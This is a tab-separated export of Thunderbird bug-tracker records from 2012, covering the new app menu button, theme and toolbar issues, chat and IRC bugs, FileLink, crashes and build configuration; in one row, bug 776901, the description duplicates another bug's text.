786358%TAB%1346143716%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%Port bug 773641 to Thunderbird's WebSearch.%TAB%Port bug 773641 to Thunderbird's WebSearch.Or just use the icon that's landing in central, if we can do that.  Using the Twitter icon we have already for chat.
785807%TAB%1346018364%TAB%97012%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%wrong icon of Previous Msg button in disabled state, after bug 650170%TAB%wrong icon of Previous Msg button in disabled state, after bug 650170Patch in bug 650170 (I assume) broke the display of the "Previous Msg" button icon. When in the disabled state, it shows the new Thundebird button icon (new menu), instead of the proper icon (blue up arrow). Can be seen on Linux and Windows XP.
785692%TAB%1345940322%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Toolbars and Tabs%TAB%Implement the AppButton on toolbars of all tabs%TAB%Implement the AppButton on toolbars of all tabsWith landing of bug 650170 the main toolbar has an AppButton and the menubar is hidden. If you switch to a other tab like Chat or Calendar this button is no more accessible and you have to press ALT to show the menubar. For usability it would be better if this button is available on every, or almost every tab toolbar.  - Is it possible to set this on every "third party" toolbar?  - If yes on which tab types should this button be inserted?  As written above Chat and Calendar should become this button. I think the Add-on tab don't needs this button because I don't see much what we need from this menu for the Add-ons tab.  - If the button is removed from main toolbar, should we then show the button on other toolbars?  I think not, when the user removes the button, he has no use for it. Or if he put it to the tabs-toolbar he has all the time access and don't need it on a other toolbar.  - What, when the user moves the button to the left or the middle of the main toolbar?  If the button is the first or last element in the main toolbar then the button can be set similar on the other toolbars. If the button is set somewhere else in the toolbar, we can't say where he wants the button exactly and we set it at the default position. The user can then move it where he wants it. And this should be saved.
785514%TAB%1345811865%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Use also inverted icons for AB and Compozer with dark Personas%TAB%Use also inverted icons for AB and Compozer with dark PersonasWith Bug 784975 the main window uses inverted icons with dark personas. AB and Compozer have actually no inverted icons. Dark icons on dark personas don't look so good.
785078%TAB%1345701137%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%The new menu button is useless on the mac%TAB%The new menu button is useless on the macThe new menu button doesn't bring anything on the mac where the menu bar is still active, maybe we should not show it by default on mac (and te red cross next to exit (while on mac it's quit) makes it horrible).
785062%TAB%1345697793%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%FileLink%TAB%Ubuntu One "Need an account" link takes user to a broken page.%TAB%Ubuntu One "Need an account" link takes user to a broken page.STR:  1) Open the Preferences dialog 2) Choose the Attachment Pane, and the Outgoing tab 3) If there are any Ubuntu One accounts listed, remove them. 4) Choose "Add" 5) Select Ubuntu One from the list, and click on the "Need an account" link.  What happens?  The user is taken to a busted page that says:   Something has gone wrong  "Sorry about that. This problem has been reported to Ubuntu One engineers and we'll fix it as quickly as possible. This may be a temporary problem, so try again in a few minutes.  You can also review the current status of Ubuntu One which may contain more information about this issue.  OOPS-066e0fc0b291992f3e4c36332aad5e39  For general information on Ubuntu One, subscribe to our mailing list, check our blog, or follow Ubuntu One on twitter, identi.ca, or facebook."   What's expected?  The user should be taken to a page that allows them to sign up for the Ubuntu One storage service.  Thunderbird is attempting to send the user to the following address:  https://one.ubuntu.com/referrals/referee/2149434/?next=/services/   I'd have to guess that this is a problem on Ubuntu One's side. I'm Cc'ing the appropriate folks.
784975%TAB%1345671054%TAB%441551%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Theme%TAB%New Menu button,New App Menu button hard to see on dark themes%TAB%New Menu button,New App Menu button hard to see on dark themesUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/17.0 Firefox/17.0 Build ID: 20120822030558  Steps to reproduce:  installed a dark Persona    Actual results:  installed a Dark Solid Persona and totally covers up the New Menu button making it hard to see   Expected results:  the New Menu button should be visible with a Dark Persona installed
784797%TAB%1345636512%TAB%98534%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Excessive left margin in conversation pane%TAB%Excessive left margin in conversation paneSince 20120822 the conversation pane show an excessive left margin. bug 768919 ? It looks fine in win 7 on a wide reso monitor, but pretty ugly on my laptop and oldish winxp systems.
784729%TAB%1345625849%TAB%366440%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Does not shows messages inside folders. Does not displays message contents. Does not seems to be changing folders. Works in --safe-mode.,Related to new App Button: After update, TB stops showing messages inside folders, message contents, changing folders has no effect. Works in --safe-mode,Related to new App Button: After update, TB stops showing messages inside folders & message contents; changing folders has no effect. Works in --safe-mode%TAB%Does not shows messages inside folders. Does not displays message contents. Does not seems to be changing folders. Works in --safe-mode.,Related to new App Button: After update, TB stops showing messages inside folders, message contents, changing folders has no effect. Works in --safe-mode,Related to new App Button: After update, TB stops showing messages inside folders & message contents; changing folders has no effect. Works in --safe-modeUser Agent: Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/17.0 Firefox/17.0 Build ID: 20120822030558  Steps to reproduce:  My Thunderbird Nightly on my 32 bit Linux got updated so I restarted it.   Actual results:  Since the restart messages in a folders are not being displayed. If I click on let's say "Inbox" it appears to be empty. I have ran the --safe-mode and disabled all the add-ons - no change. I have ran --safe-mode and chose to continue in safe mode. Seems to be working fine.   Expected results:  Yeah... We all know how I love this part... Well... I will humor You... Messages should be displayed inside the folders and when clicked they should display message content and if I switch to another folder Thunderbird should display its content...  Thanks to whoever deals with this.
784705%TAB%1345620644%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-autohide-menubar.js | test-autohide-menubar.js::test_autohidden_menubar_3pane%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-autohide-menubar.js | test-autohide-menubar.js::test_autohidden_menubar_3paneSUMMARY-UNEXPECTED-FAIL | c:\talos-slave\test\build\mozmill\message-window\test-autohide-menubar.js | test-autohide-menubar.js::test_autohidden_menubar_3pane   EXCEPTION: Context menu has been opened.     at: utils.js line 447        TimeoutError utils.js 447        waitFor utils.js 485        set_autohide_menubar test-autohide-menubar.js 40        help_test_autohide test-autohide-menubar.js 61        test_autohidden_menubar_3pane test-autohide-menubar.js 75  Almost certainly fallout from bug 650170 landing.
784676%TAB%1345614957%TAB%316757%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Moving from a menu item to another in new menu button causes menu to stay open%TAB%Moving from a menu item to another in new menu button causes menu to stay openUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/17.0 Firefox/17.0 Build ID: 20120821092158  Steps to reproduce:  Hovered over the tools menu and moved cursor to the help menu.   Actual results:  Tools menu stayed open while help menu opened.   Expected results:  Tools menu should have disappeared.  The strange is, when you go from Tools menu directly to Help the Tools popup stays. When you go from Tools menu directly to the arrow on the right of the Help menu then the Tools popup closes normally.
784037%TAB%1345442933%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%missing whitespace between icon and label in chat%TAB%missing whitespace between icon and label in chatworks as it should on the other toolbars
783899%TAB%1345367407%TAB%258347%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Thunderbird doesn't launch maximized, not full height, empty space at bottom%TAB%Thunderbird doesn't launch maximized, not full height, empty space at bottomMozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/17.0 Thunderbird/17.0a1 Application Build ID 20120819030208  When I launch Thunderbird trunk after having it closed while being maximized, the new window shows the 'maximized' icon in the top right corner, but the window doesn't stretch to the bottom. There is some space free at the bottom, showing other windows. This is likely caused by the title bar rewrite/hack.
783457%TAB%1345143461%TAB%286107%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%about:support uses hostname instead of realhostname%TAB%about:support uses hostname instead of realhostnameI've always hated the names of these two attributes, since it means people are probably going to be very apt to pick the wrong one. Looks like this line should be changed: http://hg.mozilla.org/comm-central/file/3b75111da3ba/mail/components/about-support/aboutSupport.js#l83
783267%TAB%1345094797%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%FileLink%TAB%Box.com auth window spinner is misaligned%TAB%Box.com auth window spinner is misalignedWhen the Box.com auth window first comes up, and token negotiation begins, the spinner appears to be misaligned (at least on Windows).
783022%TAB%1345020460%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%After the initial message, conversations are not indexed or searchable until TB is restarted%TAB%After the initial message, conversations are not indexed or searchable until TB is restartedSTR:  1) Create an IRC account in TB, and join an empty channel 2) On a separate client, join the same channel 3) Chat with yourself, using words that are easy to search for. 4) Upon receiving the first message from the non-TB client, note that you can search for that message  What happens?  Subsequent messages do not appear in search results until *after* TB is restarted.  What's expected?  The messages should be indexed soon after the user sees them, and then immediately searchable without a restart.  I'm not sure if my STR are accurate - I'm still feeling this one out.
782947%TAB%1345007115%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%FileLink%TAB%Add referral codes to Box Filelink component%TAB%Add referral codes to Box Filelink componentI can only assume that our partnership with Box.com on the default Filelink support means that we get some referral codes for users who sign up for an account, or who decide to upgrade if/when their storage quota is exceeded.  As it stands, we have no such referral codes in the Box.com implementation.  We should probably get those in, unless there are other arrangements that I'm not privy to.
782899%TAB%1344989010%TAB%198524%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Daily hangs and leaks memory like crazy when trying to delete messages in the results of a filter search%TAB%Daily hangs and leaks memory like crazy when trying to delete messages in the results of a filter searchMozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:17.0) Gecko/17.0 Thunderbird/17.0a1 BuildID: 20120814030529  For the last few weeks, typing a string in the filter box at the top of a folder message list pane, and the selecting multiple items in the results and attempting to delete them results in Daily immediately consuming multiple GB of RAM and hanging until it's force-quit. Confirming,; just having multiple selection kills the ponies.
782666%TAB%1344926788%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%IMSearchInput not as tall as the other searchfields%TAB%IMSearchInput not as tall as the other searchfieldsThe IMSearchInput is 4px less high than the other searchfields.
782325%TAB%1344845600%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Ensure IM conversations are reindexed when the gloda database is reset%TAB%Ensure IM conversations are reindexed when the gloda database is resetWe want to remove the JSON cache when the gloda database is nuked. Yes, since SQLite uses schema_version internally and mozStorage/gloda uses user_version, I think the preference is the easiest way to handle associating a generated id for the gloda database so that dependent data like this JSON cache can know when to be blown away.
781367%TAB%1344433099%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Clean up some old Mac code in comm-central%TAB%Clean up some old Mac code in comm-centralComm-central code contains some code pieces which are not supported anymore (mostly powerpc-apple-darwin code). This patch removes all of this unsupported code. I also opened TBSpotlight.xcodeproj with Xcode, so everything gets updated automatically. Because it complained about "Thunderbird.mdimporter" vs "thunderbird.mdimporter" I changed every occurrence of the mdimporter to "Thunderbird".
780908%TAB%1344321295%TAB%448491%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Editor,Message Compose Window%TAB%Crash when forwarding email from PayPal occurs every time and in safe mode.,Crash in nsHTMLEditor when forwarding email from PayPal occurs every time and in safe mode.%TAB%Crash when forwarding email from PayPal occurs every time and in safe mode.,Crash in nsHTMLEditor when forwarding email from PayPal occurs every time and in safe mode.User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.60 Safari/537.1  Steps to reproduce:  I opened email message from PayPal. I selected forward   Actual results:  Message window opened briefly then Thunderbird 15 crashed. Also crashed when trying again in safe mode   Expected results:  Message window should have opened for addressing
780643%TAB%1344239275%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%CSS warning in a rule of the chat button%TAB%CSS warning in a rule of the chat buttonWarning: Error in parsing value for 'text-shadow'. Declaration dropped  http://hg.mozilla.org/comm-central/annotate/f31b3e24565f/mail/themes/pinstripe/mail/primaryToolbar.css#l447
780425%TAB%1344091480%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Theme%TAB%Add Aero theming to attachment lists%TAB%Add Aero theming to attachment listsRight now, the attachment list uses old-style highlighting for the items. We should make it look like Aero, like we did with the thread/folder panes. Attached is a screenshot of what it could look like.
780200%TAB%1343980947%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%FillAttachmentListPopup() is fixed to ID attachmentMenuList%TAB%FillAttachmentListPopup() is fixed to ID attachmentMenuListFillAttachmentListPopup() looks as it accepts every popup ID to fill the needed content but only works when the ID is attachmentMenuList.  I need this function in bug 650170 to fill my popup appmenu_attachmentMenuList.
780173%TAB%1343976558%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%The "connect" button of the "Show Accounts" dialog stays disabled after disconnecting an IRC account%TAB%The "connect" button of the "Show Accounts" dialog stays disabled after disconnecting an IRC accountThe code of the "Show Accounts" window has some logic to disable the "connect" and "disconnect" buttons for half a second immediately after they have been clicked to prevent double clicks from triggering a disconnect and a reconnect at the same time.  That code is old and messy but was mostly working. However, the JS-IRC code can sometimes take more than half a second between a click on disconnect and when the account is actually disconnected, and that situation exposes a race in the existing code, that results in the "connect" button staying disabled.  I think it's time to replace this old code with a cleaner version that makes more sense.  Requesting review from aleth who took part in the discussion in the same bug for Instantbird (https://bugzilla.instantbird.org/show_bug.cgi?id=1338), but also from Mike as I'm not sure if aleth can's review is enough to check-in changes to Tb's front-end.
779976%TAB%1343908379%TAB%448174%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Set priority with XMPP%TAB%Set priority with XMPPUser Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:15.0) Gecko/20100101 Firefox/15.0 Build ID: 20120724191344  Steps to reproduce:  I added a XMPP account.   Actual results:  I cannot set a priority for my resource.   Expected results:  I should be able to set a priority for my resource.
779836%TAB%1343882411%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Cannot connect to irc.mozilla.org if there are auto-joined channels defined%TAB%Cannot connect to irc.mozilla.org if there are auto-joined channels definedSTR:  1)  Create an IRC account connecting to irc.mozilla.org, and add an auto-joined channel, like #maildev. 2)  Try to connect the account  What happens?  The "Connecting" account activity indicator just keeps spinning in the "Instant messaging status" window, and I get the following errors in the error console:  Timestamp: 02/08/2012 9:37:03 AM Error: Error running command 001 with handler RFC 2812: {"rawMessage":":concrete.mozilla.org 001 mconleyTB :Welcome to the Mozilla IRC Network mconleyTB!Thunderbir@66.207.208.98","command":"001","params":["mconleyTB","Welcome to the Mozilla IRC Network mconleyTB!Thunderbir@66.207.208.98"],"servername":"concrete.mozilla.org"} Source Code: irc  Timestamp: 02/08/2012 9:37:03 AM Error: [Exception... "'[JavaScript Error: "channel is not defined" {file: "resource:///components/irc.js" line: 901}]' when calling method: [prplIAccount::joinChat]"  nsresult: "0x80570021 (NS_ERROR_XPC_JAVASCRIPT_ERROR_WITH_DETAILS)"  location: "JS frame :: resource:///components/imAccounts.js :: <TOP_LEVEL> :: line 658"  data: yes] Source File: resource:///modules/ircHandlers.jsm Line: 102  What's expected?  I should connect.   So far, I'm only seeing this in TB 15 beta. I'll try Earlybird next.
779453%TAB%1343784157%TAB%369370%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Styling for active participants is lost when changing chatrooms%TAB%Styling for active participants is lost when changing chatroomsThe participant list of chatrooms shows inactive participants greyed out while active participants (= people who said something since the channel was joined) have a color.  Unfortunately this highlighting is lost when changing away from the channel. Instead, it should be available again when the user comes back to the channel.
779147%TAB%1343716233%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Can't spawn conversation in new chat tab from message header or address book if other conversations in progress%TAB%Can't spawn conversation in new chat tab from message header or address book if other conversations in progressSTR:  1)  Open an IM conversation with one or more contacts 2)  Close the chat tab 3)  In a message header that is showing presence for one of your chat contacts (that was not part of the conversations in part 1), click on the indicator to open up a conversation with that user.  What happens?  The chat tab is opened and focused, but no conversation for the selected user appears. What's more, manually opening a conversation with the contact from part 3 is now impossible, and throws the following error:  JavaScript error: chrome://messenger/content/chat/chat-messenger-overlay.js, line 457: conv is undefined.  What's expected?  The conversations should open properly with the selected contact.   I believe this is related to the code in openTab for the chat tab, which only appears to call _addConversation for the UI Conversations iff the element after conversationsGroup is searchResultConv.
779136%TAB%1343714602%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Make Chat button turn blue if any new unread messages exist%TAB%Make Chat button turn blue if any new unread messages existThe current behaviour of the Chat button in the 3pane is that it turns blue and shows a numeric badge when there are any "mentions" in any chat conversation.  What we'd like is for the icon to turn blue if there is any new activity in any conversation, and show the numeric badge if there are any mentions. 
779117%TAB%1343711200%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Import XMPP fixes from Instantbird%TAB%Import XMPP fixes from InstantbirdA few JS-XMPP bugs have been fixed recently for Instantbird, I think we want these fixes for Thunderbird 15: Bio 1568 - JS-XMPP should handle message type="error" stanzas instead of displaying the messages again in the conversation as incoming, r=clokep. Bio 1609 - <presence type="subscribe"/> stanzas are ignored when the JID is already in the roster, r=clokep. Bio 1556 - Download the user's vCard before uploading an avatar, r=clokep.
778791%TAB%1343638439%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Database,General%TAB%GlodaDatastore not shut down properly when opening address book or composer from cmdline%TAB%GlodaDatastore not shut down properly when opening address book or composer from cmdlineSTR (using a recent debug build)  1) Open the address book or composer from the cmdline (thunderbird -addressbook or thunderbird -compose) 2) Close the window that spawns  What happens?  Assertion failure: !connections[i]->ConnectionReady(), at /media/Projects/mozilla/thunderbird/mozilla/storage/src/mozStorageService.cpp:853  I've traced this back to GlodaDatastore not being shutdown.  What's expected?  We should should shut down the GlodaDatastore if Gloda is initted from the composer / addressbook standalone windows.
778709%TAB%1343621895%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Improve keyboard interactions with the status selector of the chat toolbar%TAB%Improve keyboard interactions with the status selector of the chat toolbarBug 735658 fixed the appearance of the chat status selector, but there are a few more details that should be fixed: - When there's no configured account, the selector should be (and look) disabled (mentioned in bug 735701 comment 1). - It should be visible if the selector is focused (for people using the tab key to navigate between focusable elements) (mentioned in point 3 or bug 735292 comment 5; and maybe some of the following comments). - Some keyboard interactions may be better. When the selector is focused, currently pressing enter starts the edit of the status message. Shouldn't the down arrow open the status type popup menu? - After finishing to edit the status message, there's no focused element in the document any more (pressing the tab key does nothing); I think we need a focus call, like the one we have when finishing the rename of a contact. - When the status type is "Offline", the status message isn't editable, so we shouldn't display the textbox border while hovering it.  This does all the things listed in comment 0 + disables the "Show Accounts" button of the chat toolbar if there's no account. The "Get started" button in the middle of the main part of the chat tab in that case is much more visible, and opens directly the account wizard instead of the accounts status dialog which could be confusing when there's no account (it's not broken though).
778664%TAB%1343607691%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Build Config%TAB%make Mac OS X 10.6 the minimum system version%TAB%make Mac OS X 10.6 the minimum system version+++ This bug was initially created as a clone of Bug #772682 +++  As per bug 772682, we need to bump the minimum OS X version of the binary for Thunderbird's config.  We need to do this after bug 778651, or we can just hide the builders on tinderbox.
778528%TAB%1343525069%TAB%258347%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Long [localized] string should break into more than one line for "don't mark as junk if in addressbook" label%TAB%Long [localized] string should break into more than one line for "don't mark as junk if in addressbook" labelIn the account manager > <Account> > Junk filter, the label for telling Thunderbird to trust senders if they are in the addressbooks selected below doesn't break into multiple lines if it is too long for one line. A horizontal scrollbar will appear.
778393%TAB%1343412833%TAB%377839%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%re-set CC, CXX on mdimporter%TAB%re-set CC, CXX on mdimporteron mail/components/search/mdimporter/Makefile.in,  CC and CXX is unexported for xcodebuild command.  but, if CC and CXX is absolute path, it build successes.
778276%TAB%1343388797%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%The topic editor for IRC channels does not appear to work,The topic editor for IRC channels does not work%TAB%The topic editor for IRC channels does not appear to work,The topic editor for IRC channels does not workSTR:  1) Join an IRC channel where you have topic-changing privileges 2) Click on the topic in the "conversation-info" panel to change it  What happens?  Nothing! Or, if there was no topic before, the "No topic" indicator goes away, but that's it.  What's expected?  We should be able to set the topic!  Mike, do we know if this is a UI level or a protocol level bug? (Are there errors in the error console that seem to be from sending a malformed message? Do you know what messages are being sent to the server?)  If we think it's a protocol level thing, knowing the server, channel (mode) and user permissions will be necessary to fully diagnose this issue.
778114%TAB%1343362061%TAB%241029%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Instant Messaging%TAB%chat sound not playing if mail notification sound disabled%TAB%chat sound not playing if mail notification sound disabledUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20100101 Firefox/14.0.1 Build ID: 20120713134347  Steps to reproduce:  enabled mail.chat.play_notification_sound while having mail.biff.play_sound disabled   Actual results:  no notification sounds played back when my name was mentioned in IRC   Expected results:  chat notification sounds should play even if mail notification sounds are disabled
777873%TAB%1343300425%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Viewing some old Twitter logs breaks log viewer%TAB%Viewing some old Twitter logs breaks log viewerIn the Chat tab, choose a previous conversation from several weeks ago  What happens?  The log is not displayed. What's more, viewing *any* logs at this point is broken.  What's expected?  The log viewer should work.
777311%TAB%1343185019%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Display the gloda autocomplete popup while typing in the gloda search box of the chat tab%TAB%Display the gloda autocomplete popup while typing in the gloda search box of the chat tabThere's no reason for the autocomplete popup to not be displayed in that search box now that it behaves like the gloda search boxes of other tabs.
777308%TAB%1343184426%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Search%TAB%searches started from autocomplete popup should include IM results%TAB%searches started from autocomplete popup should include IM resultsSteps to reproduce: - Focus the gloda search box. - Type something. - From the autocomplete popup that appears, select "Messages mentioning: <what you typed>"  Expected result: If chat is enabled, this should search both emails and IM conversations, like pressing enter in the search box does.  Actual result: Only emails are searched.
777303%TAB%1343183935%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%JavaScript strict warning: chrome://messenger/content/tabmail.xml, line 1106: reference to undefined property tab.thinking%TAB%JavaScript strict warning: chrome://messenger/content/tabmail.xml, line 1106: reference to undefined property tab.thinkingWarning: ReferenceError: reference to undefined property tab.thinking Source File: chrome://messenger/content/tabmail.xml Line: 1106  I've wasted enough time looking at this warning and wondering if it was caused by my chat tab missing a JS property, or my changes breaking something in the gloda facet view tab that I think it's worth fixing. Hopefully it will save time for others too :).  Steps to reproduce: - Open Thunderbird, the 3 pane view is selected by default. - Open a second tab. - Select the 3 pane tab.  The warning appears when selecting the 3 pane tab for the first time (not when it was automatically selected at startup).   The cause is simply that the thinking property is never initialized for the first tab: http://hg.mozilla.org/comm-central/annotate/3f7c3f228397/mail/base/content/tabmail.xml#l413 Here's the initialization for the other tabs: http://hg.mozilla.org/comm-central/annotate/3f7c3f228397/mail/base/content/tabmail.xml#l470  Trivial patch attached.
777063%TAB%1343131217%TAB%403756%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%Crash when sending HTML mail, on window close,Crash when sending HTML mail, on window close @ nsChromeTreeOwner::SetTitle,Crash when sending mail, on window close @ nsChromeTreeOwner::SetTitle%TAB%Crash when sending HTML mail, on window close,Crash when sending HTML mail, on window close @ nsChromeTreeOwner::SetTitle,Crash when sending mail, on window close @ nsChromeTreeOwner::SetTitleSTR (with Daily):  1) Compose a new HTML mail 2) Send it to someone  What happens?  Crash!  What's expected?  No crash!
776925%TAB%1343109401%TAB%99568%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End,Theme,Toolbars and Tabs%TAB%Quick Filter Status in View Menu Not Synchronized with Reality,Quick Filter Status in View Menu desyncs when the Quick Filter toolbar button is removed%TAB%Quick Filter Status in View Menu Not Synchronized with Reality,Quick Filter Status in View Menu desyncs when the Quick Filter toolbar button is removedMozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20120713 Thunderbird/14.0 View > Layout > Wide View Quick Filter toolbar NOT displayed (my default).    Dismissing the Quick Filter toolbar by using the ESC key fails to remove the checkmark for that toolbar in the View menu.    1.  In the menu bar, launch the Quick Filter toolbar by selecting [View > Toolbars > Quick Filter Bar].    2.  Dismiss the Quick Filter toolbar by using the ESC key.  The Quick Filter toolbar closes.    3.  In the menu bar, select [View > Toolbars].  There is still a checkmark next to Quick Filter Bar.    4.  In the menu bar, again launch the Quick Filter toolbar by selecting [View > Toolbars > Quick Filter Bar].    5.  In the menu bar, select [View > Toolbars].  There is no checkmark next to Quick Filter Bar even though the toolbar is present.    This lack of synchronization between the reality of the toolbar and the status shown in the View menu persists as the toolbar's presence is toggled.    If the toolbar was present when terminating Thunderbird while reality and the View menu were indeed synchronized, synchronization is lost when launching Thunderbird.    1.  In the menu bar, launch the Quick Filter toolbar by selecting [View > Toolbars > Quick Filter Bar].    2.  Terminate Thunderbird.    3.  Launch Thunderbird.  The Quick Filter toolbar is present.    4. In the menu bar, select [View > Toolbars].  There is no checkmark next to Quick Filter Bar.    ONLY if the toolbar was dismissed before terminating Thunderbird, launching Thunderbird restores the synchronization of reality with the View menu.
776901%TAB%1343104834%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Land in comm-central Instantbird's changes to chat/ - 2%TAB%Land in comm-central Instantbird's changes to chat/ - 2Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20120713 Thunderbird/14.0 View > Layout > Wide View Quick Filter toolbar NOT displayed (my default).    Dismissing the Quick Filter toolbar by using the ESC key fails to remove the checkmark for that toolbar in the View menu.    1.  In the menu bar, launch the Quick Filter toolbar by selecting [View > Toolbars > Quick Filter Bar].    2.  Dismiss the Quick Filter toolbar by using the ESC key.  The Quick Filter toolbar closes.    3.  In the menu bar, select [View > Toolbars].  There is still a checkmark next to Quick Filter Bar.    4.  In the menu bar, again launch the Quick Filter toolbar by selecting [View > Toolbars > Quick Filter Bar].    5.  In the menu bar, select [View > Toolbars].  There is no checkmark next to Quick Filter Bar even though the toolbar is present.    This lack of synchronization between the reality of the toolbar and the status shown in the View menu persists as the toolbar's presence is toggled.    If the toolbar was present when terminating Thunderbird while reality and the View menu were indeed synchronized, synchronization is lost when launching Thunderbird.    1.  In the menu bar, launch the Quick Filter toolbar by selecting [View > Toolbars > Quick Filter Bar].    2.  Terminate Thunderbird.    3.  Launch Thunderbird.  The Quick Filter toolbar is present.    4. In the menu bar, select [View > Toolbars].  There is no checkmark next to Quick Filter Bar.    ONLY if the toolbar was dismissed before terminating Thunderbird, launching Thunderbird restores the synchronization of reality with the View menu.
776884%TAB%1343101716%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%The highlight of the focused chat input box is cut on the right side%TAB%The highlight of the focused chat input box is cut on the right sideI noticed this on http://img.clubic.com/05320010-photo-thunderbird-15b1.jpg  This seems to be a regression from bug 735673, the splitter of the right-pane has a -5px -moz-start-margin at http://hg.mozilla.org/comm-central/rev/888acdb0f4bf#l1.29 I think -4px would have worked better.
776862%TAB%1343092705%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%"Restore Default Set" on the chat toolbar selects "Icons" even though "Icons beside Text" is the visible result%TAB%"Restore Default Set" on the chat toolbar selects "Icons" even though "Icons beside Text" is the visible resultSTR: - Open the chat tab (click the "Chat" button of the mail toolbar). - Right click on the chat toolbar and select "Customize" - Click the "Restore Default Set" button.  Expected result: "Show: Icons beside Text"  Actual result "Show: Icons"
776609%TAB%1343034575%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Address Book%TAB%Instant Messaging button and menuitem should integrate with new IM component.%TAB%Instant Messaging button and menuitem should integrate with new IM component.There's an Instant Messaging button and menuitem available in our address book. That button / menuitem should integrate with our new IM component.  From Florian:  "If we know that the contact is available, we should do the same thing as what happens when the user clicks the presence icon in an email header. If we don't know/the contact isn't available, we should just fallback to the old behavior (ie starting the default AIM client of the system if there's an AIM screenname in the address book card)"  So, I've started hacking on this, and I've noticed that the IM command also works when we have multiple contacts selected.  3 cases, with my question being in the 3rd:  Case 1:  User has selected all contacts that are online via the IM component. In this case, conversations are opened up with each contact, and the chat tab is opened to focus on the conversation with the last contact in the selection.  Case 2:  User has selected no contacts that are online via the IM component. In this case, we revert to the old behaviour, and attempt to communicate with all of those users via an AIM client.  Case 3:  User has selected some contacts that are online via the IM component. In this case...do we try to communicate with the available contacts via IM, and *also* open up the AIM client?
